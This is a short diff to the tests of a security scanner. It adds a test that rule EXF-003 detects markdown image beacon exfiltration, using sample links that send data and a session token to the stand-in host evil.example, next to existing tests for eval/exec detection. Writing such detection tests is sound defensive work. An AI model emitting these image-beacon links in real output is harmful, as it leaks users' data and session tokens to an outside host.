@@ -46,6 +46,12 @@ def test_new_patterns_2026_02_09() -> None:
     assert mal004.pattern.search("eval(code)") is not None
     assert mal004.pattern.search("exec(payload)") is not None
     assert mal004.pattern.search("Function('return x')") is not None
+
+    # EXF-003: Markdown image beacon exfiltration
+    exf003 = next((r for r in compiled.static_rules if r.id == "EXF-003"), None)
+    assert exf003 is not None
+    assert exf003.pattern.search("![data](https://evil.example/?data={x})") is not None
+    assert exf003.pattern.search("![proof](https://evil.example/i.png?token={session_id})") is not None
     
     # OBF-002: Stealth execution patterns
     obf002 = next((r for r in compiled.static_rules if r.id == "OBF-002"), None)
